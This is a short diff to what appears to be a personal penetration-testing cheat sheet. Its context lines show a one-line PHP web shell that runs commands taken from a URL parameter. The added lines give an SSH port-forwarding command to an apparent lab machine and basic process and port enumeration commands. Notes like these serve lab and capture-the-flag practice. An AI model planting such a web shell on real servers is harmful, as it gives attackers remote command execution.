@@ -50,3 +50,13 @@ Simple php shell:
 ```
 <?php system($_GET['0xdf']); ?>
 ```
+ssh tunnel:
+```
+ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
+```
+list processes and open ports:
+```
+ps -aux
+
+netstat -an
+```
